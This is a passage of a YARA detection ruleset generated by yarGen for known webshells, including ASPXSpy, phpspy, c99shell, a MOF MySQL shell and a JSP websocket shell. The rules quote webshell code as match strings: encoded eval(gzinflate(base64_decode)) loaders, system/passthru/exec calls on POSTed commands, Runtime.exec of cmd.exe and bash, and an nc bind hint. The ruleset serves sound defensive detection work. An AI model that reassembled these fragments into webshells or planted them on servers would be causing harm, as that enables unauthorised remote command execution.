      $x15 = "<td ><span style=\"float:right;\"><a href=\"http://www.rootkit.net.cn\" target=\"_blank\">ASPXSpy Ver: 2009</a></span><span id=" ascii
      $s16 = " <input class=\"input\" runat=\"server\" id=\"kusi\" type=\"text\" size=\"100\" value=\"c:\\windows\\system32\\cmd.exe\"/>" fullword ascii
      $s17 = "<asp:LinkButton ID=\"UtkN\" runat=\"server\" OnClick=\"YKpI\" Text=\"Logout\" ></asp:LinkButton> | <asp:LinkButton ID=\"RsqhW\" " ascii
      $s18 = " <td colspan=\"5\">CmdShell&nbsp;&nbsp;:&nbsp;<input class=\"input\" runat=\"server\" id=\"mHbjB\" type=\"text\" size=\"100\" va" ascii
      $s19 = "Bin_H2_Title.InnerText=\"Execute Command >>\";" fullword ascii
      $s20 = "<p>ConnString : <asp:TextBox id=\"MasR\" style=\"width:70%;margin:0 8px;\" CssClass=\"input\" runat=\"server\"/><asp:DropDownLis" ascii
   condition:
      uint16(0) == 0xbbef and filesize < 200KB and
      1 of ($x*) and all of them
}

rule phpspy2010 {
   meta:
      description = "webshell - file phpspy2010.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "0cab98c7ab99b8a5a624e2b39fb7c3f36809a0032b5cb467f33080f55951ccf0"
   strings:
      $x1 = "eval(gzinflate(base64_decode('7b39d1zXcSD4M3yO/4fHVtuvm2z0Bwh+AWyQIACSoEAAAkBSFIF0+uN14xHd/Vr9XgOEaP4xSnbPeCfZE8uWZDuSLH/IY1uOLM" ascii
      $s2 = "Gq3P9Jx71FyZ9tut/yq60o1QeYegTEwx78STI+1ik+LjBsXGTYpNCwcbFhpct3THTYMcPDDo0PaxzqSQd0vSeiAvMxP5kdVi8uCsAjXWE/ouv45zFg/yXGgB03COw4Bz" ascii
      $s3 = "jTR6nbGD0A2RgmEnmohoxNRtDwAnbFJkW4TjJEJwlLQnGG4zfDkUt9+mR+9ZOv/RO6l0kih/0++9W+8kKGzHZW+V1B2z72tCR9qtLOg3p70GBne7bmOcOTtVtIszboxD" ascii
      $s4 = "OU4IuYtTsVlyE4cRoa1ecuJVAbqKrPlPCTs/aZK2fPn72KIAftPIn1tqtA80LT09NRePpvrP4wzLik8QgQ586dm22CQhPMtJ1mMNsAQd6uHs7U2l59b/bAbYAULp0pAi" ascii
      $s5 = "Q+K01eKtXS6gvdWsvVlU97m05RCrbWzuyQ4oVCbHF6hYIHv+bpOQvDGqNVrhCHIf+JAx1W/3lWDOFwhr32zk/ef/P10FxDadpjpDOoRQY5uvshrWIxXaU4i+wxYV5Bhc" ascii
      $s6 = "xYRmAfbtmpfLXR8GEHveuEBiafsqHU1lqkP1eXl1YWN62tpY2by6vQ4UXryl3YR3KsHip97xHDy7aWNhfm13k521pZXl06SnVFpLhxFcRtwp5HIakPizaCkXy+ge17Bw" ascii
      $s7 = "EYimzmErzQdsJhIPk3RgvtV9u6+X7YmSOe3QvNgakwveTzEioMo9+vhe0JXMWIfQoxvsXQkw7iZURFP2nD1gxBsrunyooxtOyooUhTTsY8ZgH8MMz8AMafIi4+jO3Ao3" ascii
      $s8 = "JjoQyN+CWmQ+HyzUNz4SpbqPs+aVdsV/CQrcG4UN92+o1qtzp7ZX7h2Wsba7dWF2esZ67SfyI4mlU6L3U8+FCr+1n6bxZRBr0Lm6TGjTCMdJFO3rSL0fAimAC7gxZ/AM" ascii
      $s9 = "WRapzGiDaLZvzRkeyrLU0KLKl4imJ9ryeOdJ+wL9iO+VqKajVlxJ2CNtm6pvdAngJLTOXUCd2HTeaH0XYPfgEv2cRhBCP83MrxFKwcn6JNIhFjEbdQ4WkvyCTUDjGFGf" ascii
      $s10 = "yD1yjl1ttEShOaOkKhxZBre5xFtOfXND0xQQMTEcdCdYT+iLXqLIAtHwfdbMUAqUW+LAvLNBzgEaWm+GyQD/SZmDOtMPIOVAIppGr7OMSIlFaKcpQQY1Iga7xzZ/Tpnt" ascii
      $s11 = "JbsDLLm5U7y6u4k4NfC2s3uapAWmHfa/WrHdrl9arwCxYx9aYCASrTAgnVMvYmfufne722W2cvjom9D4btZcUn56jUEt8GiRZyGnjxuoK9zlvvD7oYdBdPzk8AqEvQBf" ascii
      $s12 = "9k8CPdwQyrbDkPem2v4WRsy85ZHbfe96hGlgpReV6Q1bhX2rFOid/FHSjUcJpuF+pvzlc21ta2AIofEGrtah2St7chxS7APw23360C6Erl6vLKUqWSzeYhPauBWN6s3F" ascii
      $s13 = "oSMiQTtdAzE8pH54mbVjYWw6TCzBTSV+JeBPROyOxyRje7nI03u4hORqwq4Z6G5vJYIjLpbpxukIraaEwDjN5raY5Z5p+FWGTjBOvxocJ8XrSQluwzHpXoWWTOCgvjR4" ascii
      $s14 = "pdPVxe6OH31J1SsQfII++3oOni8rUX9pBRlwGtevf2fahHXEP8374AU/jKS9AUlb87tbtbd4FDnl+t3bx/tbG+CUzKW4bZ+YKL03AeGPTK3t07twOcMjc3Dw6IhgzMoA" ascii
      $s15 = "TyHvvJVkbtrUUTA9U/MfzHRK5TklyrsK7IPSe7MukZrVmP31eCwZrBZ1a0ZmYj/Kh9XKIHNdexMt25kDn8XU0CIazufScY9LtadbbIFQrWaz/6/ls//i9v/5+aOG57sE" ascii
      $s16 = "6v3aEX1q7Mby5tpoReUgsHLsIkCkljT05amywmRNVqiJ3P5KStLn0goSVNjHfJqGF1+wNhptHRQeyg7J0dChhqJCndMiq25UJrRqtQmM0YBw33dgzBDu2bIp1zge11gQ" ascii
      $s17 = "Pu1sUdD7XIi+8hCgVt9ufseFNSzo6zHXFvqIjVB+3BI01feqA6IU8paAaPUscIqA4VwzLpRNnO55nPWGyeFsYuk2bmKSrMf5bLVuwMV0dq7AY8TiggNI4STa3YOrNxVU" ascii
      $s18 = "TBox3YeBDwK/ANgCmBphKBfXSJcbTJ9vAHu3BE4VI6E5UuMH/mLhJsao/7v3VQzAgHOFqZynPaLhvFZae65+y66LsoUmdZ1abnBdzFRFjnQRPvZPhHVpy+v/H3P375tV" ascii
      $s19 = "eoRyVzJ6NklGgNoDOTFc4ilc2QBIL2zfI5gT5QdFzh9q1XP/oP4fnhS6IK8+TDWGKJ3Ai1/BCtiO9grefEeAoU46gAwUDUuI4udXxGGoGssRZ4R1wK3v7p919Glw6dWv" ascii
      $s20 = "OHNDwHDwUDi+rxU17jrAWUwUVVHDVBB4YpA79A59QO1qF36qhZJEJbPnNUoQ6zAx47m9XdVFivX331ra/yXksnLd0uw3SZzh4k+DiinKj5tGmGIUqYZ6ZURaOD1h105K" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule webshell_php_2013 {
   meta:
      description = "webshell - file 2013.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e2219e788d89546f19f6f0cb37ee472c5e0de01fb732d2606f3878c5c27e2454"
   strings:
      $s1 = "eval(gzinflate(base64_decode('3X1rcyPJceBnKkL/oQcLbQO7IF4kZ4bEkDMcksPhLIfkECTnRQbUABpAD4FubHeDjx3Nj/HZEfad78JarV621tJZu7rVrh+7Z8" ascii
      $s2 = "BNbMJ66AT0mx3Z0CnUTcN8yFNMPInf8NxJASJ3OfzYMjrjCY6dsNVjJ0HMBtLCLZ6yq2dSFpn76ld/9zfYwejEhDjDrgo0EL85c1kaEzg+LDK5W4NDcfpVBIRC+dq1a8" ascii
      $s3 = "+Nl3y4dwpFnW46i4dreyejNYeKeNaszoyePNwov3FnY+tBObyzt0RkqKYamXT8o9bq3ghwd7dX+pvQGs6W84TY2t574PCS38A+GcBQejjt7Va2V3YqyL0OGofZ3rtXT4" ascii
      $s4 = "qz+mHOXMH3NZiNQtxqEeDsntGETq+i0MtC+aN+qK+JWa0x2XVQK/T6AgqaoOF7x8A4w1YhIz/dcbNuapxrrkoh1RVOXmV07H4bmKB4v6hH47lqg1JTedIu5whkdkNHuS" ascii
      $s5 = "Z2eD1HXkakaztXkpDNvtdM50QwegFedCIIYw+G4anSAMgl/0F8lU31DT61/rSoyyevYu9Ra5DlE7PYdNxqzz6JSoo9lhUjECsp5sPBFnXa01KK3KHFVBjZg0WFV+VQKT" ascii
      $s6 = "DCjwD/nJaGffgYdR23lLyVsWqHxrCPmQEzT8ZnLX+QitsysO7pvS/eG1Se2BBPLcTmPILGVDP5srt6swampbxOgwH1WXD1vk0x9DsUPBOHbOH8pxXiA5wilPBntaOYxj" ascii
      $s7 = "CqbpMEMDJMO8vQonY+jmEgDru1yP5eFHM/jGOeRUWMAJ6mNBPGkPz+b3z8Z0oT6c9c5RUNCtY5YCKHExJFNexew9wtEcKfP9qQB3FUuJ4vTE7LXaCkrL2KxWckeRGqBq" ascii
      $s8 = "LPuQRFWDCG7HLuGFse7lGmp6eUqFSwsITpzSHr+joVl14ZWVFedLypQTV33KHVtXOx04jUEHQEfd7xAarJMGaVIwAliR+rmNXy2MOisecG66z05EGBCOmnVkyeELQ6/B" ascii
      $s9 = "7fXEIvlVKJJWzs3k+0IdERW4UUasmS+St0gMyrWCpxh+ahELwtNE/NvdIpl9krAih/2H5PSpycfCCK8RFR1TsxXcAwaUKP/hnsgT3AQo4UUaCMf5LK3LAl1hLKSK8ce/" ascii
      $s10 = "mW0LuBJwMUGkG5HIuZJ/Wts2qG5My43rFvDRdusFNNbo9shqyB+CjmLSR+MVGduQc/DfzNZl1zBP3kZhYi+sLQOREZGrS2lQP1ZRtXjBzh1UGOH6lNzmspBHS0UT+zrQ" ascii
      $s11 = "BQB1A0mgo2XddJoLNUBZ8lyJPm6Bk6ymZXZ+JUeGpERYABMrWbQoG/T6cTUN6xU4H0stn5WhyVp0a4AmxOOUHTyuKXpFC/0e/ys56gFjiIxUyjHPpxoAwiTMTvmMZGnZ" ascii
      $s12 = "Vx+RCrdw9bU/232qt7IcPdCJpTG33OCi95M5k1u7e3xGu+OvvWk3pvBybXnd0+9vf8PIsrpM6IRgvmBPT44+pJ5cnqbnfr7kYZRszR+qD7OgzAZ9bDmWfNu3uHML6vI0" ascii
      $s13 = "OZq0LqhWQgrl9FZjD6TWQWEoXsHAwzeEo/BN6a27ZPDrgDKBvc0TGmEkiF9750CGwD78j9XKorCSuVWcT4ShWZ4HiCum5ScUrkEemzhiq/KHIH88eWx642MguODBASla" ascii
      $s14 = "13330uUl/gr5sskC+PGQz85DI3M8XMggC6cTOj7dRTJYD2rEaaFEDCQgKwmV45a6bjfEKLSlLUyDKiyYlvVylTUjRBJDGkSRLfi54rlY7Nonl8XJyGD7cLf+x+0bXDEm" ascii
      $s15 = "UZOyDffCsxeHhqNHoEmD7w5A3Fg8RkEBnk7yp+inEjfnNZLUfkDeTugoLBopZk8RxX1u9gUEmDtYyAZL+kaJCFsp9Uo4MxgkJMvIRrki7eU7yUmHIxERMnTMMet+x9Nq" ascii
      $s16 = "WlE8dDd0hTlZcMnK0t3e7bq/3yG8uLQzZ0ytS/UMyzxyBsWoPKW+ts+EEj326L/rcfwch/WKZ8bPi1RcBd3a60lte8J4MHwZqgp6WtDMVcTGStcfC9aWig4I2ltaPHMB" ascii
      $s17 = "/e/hh1wQ7IL1yo2k5w2MAfDfIeiNyLrjAQXBw4LAnRrNXvSzxYHqx+EhFByF2uL2UvGhHIUAJpk0QQU4c580avqm0pjUkjOq0JDg0q2yziyScfKZgCcsbwOno6UMbknF" ascii
      $s18 = "54FDMk6xZkHK/skTwSPZInokcJXdgdrwYrD57hiMNbhoouLGPfHhWMzL6byYMWKELd8hAg2SNQMJu+URJYOA2j8CBkbyQYxcqY8gTZC6WqUJtB0GW1YKNanZz8GTmcmw" ascii
      $s19 = "tPIW6z3fJ83MeZoyP26i8Ga4G/bf/YbraZDXqAn/5hb4SunZjUO/RBuT4kdRyWWnL4oa+dY+QVlt9jxydmeni3i6pKJn5QZH2sTuDSHDc9WC6Je6cdWO0BIrdQUHQR5s" ascii
      $s20 = "2eBHXg+Km16EiwRF+IrLG1YOxRTwjYguA1dfyQUimrodYhpQKJwUP7lzRe0xk1YZiENHEKBvHL/0roGItkNMq1m4wS273krojfEeVszmw3ceKZ+WKIuxgEKEL3j0ApN+" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 70KB and
      8 of them
}

rule webshell_php_PHPSPY {
   meta:
      description = "webshell - file PHPSPY.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "54bdd255c812288be22598090c1417b2d5d8c3558086c84150d7a62303352b2e"
   strings:
      $s1 = "$result=shell_exec($_POST['command']);" fullword ascii
      $s2 = "$result = exec($_POST['command']);" fullword ascii
      $s3 = "$info[37] = array(\"FTP\",getfun(\"ftp_login\"));" fullword ascii
      $s4 = "header('Content-Description: PHP3 Generated Data');" fullword ascii
      $s5 = " <a href=\\\"http://www.4ngel.net\\\" target=\\\"_blank\\\">http://www.4ngel.net</a> " fullword ascii
      $s6 = "if ($_POST['action'] == \"login\") {" fullword ascii
      $s7 = "</a> | <a href=\"http://www.4ngel.net\" target=\"_blank\" title=\"" fullword ascii
      $s8 = "<span style=\"font-size: 11px; font-family: Verdana\">Password: </span><input name=\"adminpass\" type=\"password\" size=\"20\"><" ascii
      $s9 = " max_execution_time\",getphpcfg(\"max_execution_time\").\"" fullword ascii
      $s10 = "\",\"<a href=\\\"http://$_SERVER[SERVER_NAME]\\\" target=\\\"_blank\\\">$_SERVER[SERVER_NAME]</a>\");" fullword ascii
      $s11 = "<span style=\"font-size: 11px; font-family: Verdana\">Password: </span><input name=\"adminpass\" type=\"password\" size=\"20\"><" ascii
      $s12 = "system($_POST['command']);" fullword ascii
      $s13 = "} elseif ($execfunc==\"passthru\") {" fullword ascii
      $s14 = "passthru($_POST['command']);" fullword ascii
      $s15 = "echo \"Processed in $totaltime second(s)\";" fullword ascii
      $s16 = "\" : \"<a href=\\\"mailto:\".get_cfg_var(\"sendmail_from\").\"\\\">\".get_cfg_var(\"sendmail_from\").\"</a>\";" fullword ascii
      $s17 = "<option value=\"passthru\" <? if ($execfunc==\"passthru\") { echo \"selected\"; } ?>>passthru</option>" fullword ascii
      $s18 = "pe=\"hidden\" name=\"action\" value=\"login\">" fullword ascii
      $s19 = "$adminmail=(isset($_SERVER[\"SERVER_ADMIN\"])) ? \"<a href=\\\"mailto:\".$_SERVER[\"SERVER_ADMIN\"].\"\\\">\".$_SERVER[\"SERVER_" ascii
      $s20 = "} elseif ($execfunc==\"shell_exec\") {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 80KB and
      8 of them
}

rule phpspy_2005_lite {
   meta:
      description = "webshell - file phpspy_2005_lite.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3c7f22c9123e04109df7ec11a9a94cc1b552d0ab33f2b2e5e35deacf27841f2c"
   strings:
      $s1 = "</a><?=$phpinfo?><?=$shellmode?> | <a href=\"?action=sql\">SQL Query</a> | <a href=\"http://www.4ngel.net\" target=\"_blank\" ti" ascii
      $s2 = "$result=shell_exec($_POST['command']);" fullword ascii
      $s3 = "header('Content-Description: PHP Generated Data');" fullword ascii
      $s4 = "$result = exec($_POST['command']);" fullword ascii
      $s5 = " angel [<a href=\\\"http://www.bugkidz.org\\\" target=\\\"_blank\\\">BST</a>] " fullword ascii
      $s6 = " <a href=\\\"http://www.4ngel.net\\\" target=\\\"_blank\\\">www.4ngel.net</a> " fullword ascii
      $s7 = " <a href=\\\"http://www.4ngel.net\\\" target=\\\"_blank\\\">Security Angel</a> " fullword ascii
      $s8 = "<span style=\"font-size: 11px; font-family: Verdana\">Password: </span><input name=\"adminpass\" type=\"password\" size=\"20\">" fullword ascii
      $s9 = "system($_POST['command']);" fullword ascii
      $s10 = "} elseif ($execfunc==\"passthru\") {" fullword ascii
      $s11 = "passthru($_POST['command']);" fullword ascii
      $s12 = "echo \"Processed in $totaltime second(s)\";" fullword ascii
      $s13 = "<option value=\"passthru\" <? if ($execfunc==\"passthru\") { echo \"selected\"; } ?>>passthru</option>" fullword ascii
      $s14 = "<input type=\"submit\" name=\"login\" value=\"OK\">" fullword ascii
      $s15 = "if ($login) {" fullword ascii
      $s16 = "} elseif ($execfunc==\"shell_exec\") {" fullword ascii
      $s17 = "header('Content-Length: '.filesize($downfile));" fullword ascii
      $s18 = "elseif ($_GET['action'] == \"shell\") {" fullword ascii
      $s19 = "if ($_GET['action'] == \"logout\") {" fullword ascii
      $s20 = "$phpinfo=(!eregi(\"phpinfo\",$dis_func)) ? \" | <a href=\\\"?action=phpinfo\\\" target=\\\"_blank\\\">PHPINFO()</a>\" : \"\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 60KB and
      8 of them
}

rule mof {
   meta:
      description = "webshell - file mof.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "f8c4308f482eef6e9971777ffda8caa8e60e0b05404f150f8e394f1c94924565"
   strings:
      $s1 = "$payload = \"#pragma namespace(\\\"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\.\\\\\\\\\\\\\\\\root\\\\\\\\\\\\\\\\subscription\\\")" fullword ascii
      $s2 = "  echo \"<hr>Execute Successful!<br> Please click the read button to check the  result!!<br>If the result is not correct,try rea" ascii
      $s3 = "$cmdshell='cmd /c '.$strCmd.'>'.$path;" fullword ascii
      $s4 = "$sql1=\"select '$payload' into dumpfile '$mofname';\";" fullword ascii
      $s5 = "  echo \"<hr>Execute Successful!<br> Please click the read button to check the  result!!<br>If the result is not correct,try rea" ascii
      $s6 = "  \\\"var WSH = new ActiveXObject(\\\\\\\\\\\"WScript.Shell\\\\\\\\\\\")\\\\\\\\nWSH.run(\\\\\\\\\\\"$cmdshell\\\\\\\\\\\")\\\";" ascii
      $s7 = "<head><title>Win MOF Shell</title></head>" fullword ascii
      $s8 = "setcookie(\"connect[host]\",$_POST['host']);" fullword ascii
      $s9 = "$conn=mysql_connect($_COOKIE[\"connect\"][\"host\"],$_COOKIE[\"connect\"][\"user\"],$_COOKIE[\"connect\"][\"pass\"])  or die('<p" ascii
      $s10 = "  $conn=mysql_connect($_COOKIE[\"connect\"][\"host\"],$_COOKIE[\"connect\"][\"user\"],$_COOKIE[\"connect\"][\"pass\"])  or die('" ascii
      $s11 = "echo \"Cmd:\";" fullword ascii
      $s12 = "$mofname=\"c:/windows/system32/wbem/mof/system.mof\";" fullword ascii
      $s13 = "$strCmd=$_POST['cmd'];" fullword ascii
      $s14 = "<input type=\"text\" name=\"host\" value=\"192.168.200.144:3306\"><br/>" fullword ascii
      $s15 = "if (isset($_POST['cmd'])){" fullword ascii
      $s16 = "setcookie(\"connect[dbname]\",$_POST['dbname']);" fullword ascii
      $s17 = "  $conn=mysql_connect($_COOKIE[\"connect\"][\"host\"],$_COOKIE[\"connect\"][\"user\"],$_COOKIE[\"connect\"][\"pass\"])  or die('" ascii
      $s18 = "$conn=mysql_connect($_COOKIE[\"connect\"][\"host\"],$_COOKIE[\"connect\"][\"user\"],$_COOKIE[\"connect\"][\"pass\"])  or die('<p" ascii
      $s19 = "setcookie(\"connect[pass]\",$_POST['pass']);" fullword ascii
      $s20 = "setcookie(\"connect[user]\",$_POST['user']);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 8KB and
      8 of them
}

rule wsAddAllContainer {
   meta:
      description = "webshell - file wsAddAllContainer.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5e3ed0fd9571701802cff84d529d0f339ad3d73ca1a7c707b1d5738961d9c191"
   strings:
      $x1 = "                    process = Runtime.getRuntime().exec(new String[] { \"cmd.exe\", \"/c\", s });" fullword ascii
      $s2 = "                    process = Runtime.getRuntime().exec(new String[] { \"/bin/bash\", \"-c\", s });" fullword ascii
      $s3 = "                InputStream inputStream = process.getInputStream();" fullword ascii
      $s4 = "<%@ page import=\"com.sun.jmx.mbeanserver.Repository\" %>" fullword ascii
      $s5 = "<%@ page import=\"com.sun.jmx.mbeanserver.NamedObject\" %>" fullword ascii
      $s6 = "<%@ page import=\"weblogic.servlet.internal.WebAppServletContext\" %>" fullword ascii
      $s7 = "<%@ page import=\"javax.websocket.server.ServerEndpointConfig\" %>" fullword ascii
      $s8 = "                session.getBasicRemote().sendText(stringBuilder.toString());" fullword ascii
      $s9 = "<%@ page import=\"java.util.HashSet\" %>" fullword ascii
      $s10 = "<%@ page import=\"java.util.Set\" %>" fullword ascii
      $s11 = "                Process process;" fullword ascii
      $s12 = "        HashSet set = (HashSet)field.get(obj);" fullword ascii
      $s13 = "                process.waitFor();" fullword ascii
      $s14 = "        public void onOpen(final Session session, EndpointConfig config) {" fullword ascii
      $s15 = "                    out.println(\"add success,path: \" + servletContext.getContextPath()+path);" fullword ascii
      $s16 = "<%@ page import=\"java.io.*\" %>" fullword ascii
      $s17 = "<%@ page import=\"javax.websocket.*\" %>" fullword ascii
      $s18 = "<%@ page import=\"javax.websocket.server.ServerContainer\" %>" fullword ascii
      $s19 = "        obj = field.get(namedObject.getObject());" fullword ascii
      $s20 = "<%@ page import=\"javax.management.ObjectName\" %>" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 10KB and
      1 of ($x*) and 4 of them
}

rule webshell_php_c66 {
   meta:
      description = "webshell - file c66.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5d7709a33879d1060a6cff5bae119de7d5a3c17f65415822fd125af56696778c"
   strings:
      $x1 = "?><html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\"><meta http-equiv=\"Content-Language" ascii
      $x2 = "if ($act == \"about\") {echo \"<center><b>Credits:<br>Idea, leading and coding by tristram[CCTeaM].<br>Beta-testing and some tip" ascii
      $x3 = "    ?><table border=\"0\" width=\"100%\" height=\"1\"><tr><td width=\"30%\" height=\"1\"><b>Create new table:</b><form action=\"" ascii
      $x4 = "if (!preg_match($s,getenv(\"REMOTE_ADDR\")) and !preg_match($s,gethostbyaddr(getenv(\"REMOTE_ADDR\")))) {exit(\"<a href=\\\"http" ascii
      $x5 = "  echo \"<center><b>MySQL \".mysql_get_server_info().\" (proto v.\".mysql_get_proto_info ().\") running in \".htmlspecialchars($" ascii
      $x6 = "\"<b>nc -v \".getenv(\"SERVER_ADDR\").\" \".$bind[\"port\"].\"</b>\\\"!<center><a href=\\\"\".$surl.\"act=processes&grep=\".base" ascii
      $s7 = "ent=\"en-us\"><title><?php echo getenv(\"HTTP_HOST\"); ?> - phpshell</title><STYLE>TD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-FAM" ascii
      $s8 = " displaysecinfo(\"Kernel version?\",myshellexec(\"sysctl -a | grep version\"));" fullword ascii
      $s9 = "am.ru/releases/cc99shell\\\">c99shell</a>: Access Denied - your host (\".getenv(\"REMOTE_ADDR\").\") not allow\");}" fullword ascii
      $s10 = " if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><font color=green><a href=\\\"\".$surl.\"act=f&f=accounting.l" ascii
      $s11 = " if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><font color=green><a href=\\\"\".$surl.\"act=f&f=accounting.l" ascii
      $s12 = "  $file = $tmpdir.\"dump_\".getenv(\"SERVER_NAME\").\"_\".$db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\";" fullword ascii
      $s13 = "     echo \"<form method=\\\"GET\\\"><input type=\\\"hidden\\\" name=\\\"act\\\" value=\\\"sql\\\"><input type=\\\"hidden\\\" na" ascii
      $s14 = "  function c99ftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh)" fullword ascii
      $s15 = "e=\"text\" name=\"dump_file\" size=\"30\" value=\"<?php echo \"dump_\".getenv(\"SERVER_NAME\").\"_\".$sql_db.\"_\".date(\"d-m-Y-" ascii
      $s16 = "rver).\":\".htmlspecialchars($sql_port).\" as \".htmlspecialchars($sql_login).\"@\".htmlspecialchars($sql_server).\" (password -" ascii
      $s17 = "\\\"dump\\\"><input type=\\\"hidden\\\" name=\\\"sql_db\\\" value=\\\"\".htmlspecialchars($sql_db).\"\\\"><input type=\\\"hidden" ascii
      $s18 = " $out = \"# Dumped by C99Shell.SQL v. \".$shver.\"" fullword ascii
      $s19 = " echo \"<form action=\\\"\".$surl.\"\\\" method=POST><input type=hidden name=act value=cmd><textarea name=cmd cols=122 rows=10>" ascii
      $s20 = "<tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>Enter: </b><form action=\"<?php echo $surl; ?>\"><input type=hidden" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule c99shell {
   meta:
      description = "webshell - file c99shell.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "d08c928417669a722d324df5ea1448b65637b2e109c704556e3870dcfe07fee1"
   strings:
      $x1 = "?><html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\"><meta http-equiv=\"Content-Language" ascii
      $x2 = "if ($act == \"about\") {echo \"<center><b>Credits:<br>Idea, leading and coding by tristram[CCTeaM].<br>Beta-testing and some tip" ascii
      $x3 = "    ?><table border=\"0\" width=\"100%\" height=\"1\"><tr><td width=\"30%\" height=\"1\"><b>Create new table:</b><form action=\"" ascii
      $x4 = "if (!preg_match($s,getenv(\"REMOTE_ADDR\")) and !preg_match($s,gethostbyaddr(getenv(\"REMOTE_ADDR\")))) {exit(\"<a href=\\\"http" ascii
      $x5 = "*  + ??????? ftp-???????????? ?? ?????? login;login ?? /etc/passwd (?????? ???? ?????? ? 1/100 ?????????)" fullword ascii
      $x6 = "  echo \"<center><b>MySQL \".mysql_get_server_info().\" (proto v.\".mysql_get_proto_info ().\") running in \".htmlspecialchars($" ascii
      $x7 = "\"<b>nc -v \".getenv(\"SERVER_ADDR\").\" \".$bind[\"port\"].\"</b>\\\"!<center><a href=\\\"\".$surl.\"act=processes&grep=\".base" ascii
      $s8 = " displaysecinfo(\"Kernel version?\",myshellexec(\"sysctl -a | grep version\"));" fullword ascii
      $s9 = "am.ru/releases/cc99shell\\\">c99shell</a>: Access Denied - your host (\".getenv(\"REMOTE_ADDR\").\") not allow\");}" fullword ascii
      $s10 = "ent=\"en-us\"><title><?php echo getenv(\"HTTP_HOST\"); ?> - c99shell</title><STYLE>TD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-FAM" ascii
      $s11 = " if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><font color=green><a href=\\\"\".$surl.\"act=f&f=accounting.l" ascii
      $s12 = " if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><font color=green><a href=\\\"\".$surl.\"act=f&f=accounting.l" ascii
      $s13 = "  $file = $tmpdir.\"dump_\".getenv(\"SERVER_NAME\").\"_\".$db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\";" fullword ascii
      $s14 = "m/scripts/contact.dll?msgto=656555\\\"><img src=\\\"http://wwp.icq.com/scripts/online.dll?icq=656555&img=5\\\" border=0 align=ab" ascii
      $s15 = "  function c99ftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh)" fullword ascii
      $s16 = "     echo \"<form method=\\\"GET\\\"><input type=hidden name=act value=\\\"sql\\\"><input type=hidden name=\\\"sql_act\\\" value" ascii
      $s17 = "rver).\":\".htmlspecialchars($sql_port).\" as \".htmlspecialchars($sql_login).\"@\".htmlspecialchars($sql_server).\" (password -" ascii
      $s18 = " $out = \"# Dumped by C99Shell.SQL v. \".$shver.\"" fullword ascii
      $s19 = " echo \"<form action=\\\"\".$surl.\"\\\" method=POST><input type=hidden name=act value=cmd><textarea name=cmd cols=122 rows=10>" ascii
      $s20 = "<tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>Enter: </b><form action=\"<?php echo $surl; ?>\"><input type=hidden" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 500KB and
      1 of ($x*) and 4 of them
}

rule webshell_php_c99 {
   meta:
      description = "webshell - file c99.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
   strings:
      $x1 = "?><html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\"><meta http-equiv=\"Content-Language" ascii
      $x2 = "if ($act == \"about\") {echo \"<center><b>Credits:<br>Idea, leading and coding by tristram[CCTeaM].<br>Beta-testing and some tip" ascii
      $x3 = "    ?><table border=\"0\" width=\"100%\" height=\"1\"><tr><td width=\"30%\" height=\"1\"><b>Create new table:</b><form action=\"" ascii
      $x4 = "if (!preg_match($s,getenv(\"REMOTE_ADDR\")) and !preg_match($s,gethostbyaddr(getenv(\"REMOTE_ADDR\")))) {exit(\"<a href=\\\"http" ascii
      $x5 = "  echo \"<center><b>MySQL \".mysql_get_server_info().\" (proto v.\".mysql_get_proto_info ().\") running in \".htmlspecialchars($" ascii
      $x6 = "\"<b>nc -v \".getenv(\"SERVER_ADDR\").\" \".$bind[\"port\"].\"</b>\\\"!<center><a href=\\\"\".$surl.\"act=processes&grep=\".base" ascii
      $s7 = " displaysecinfo(\"Kernel version?\",myshellexec(\"sysctl -a | grep version\"));" fullword ascii
      $s8 = "am.ru/releases/cc99shell\\\">c99shell</a>: Access Denied - your host (\".getenv(\"REMOTE_ADDR\").\") not allow\");}" fullword ascii
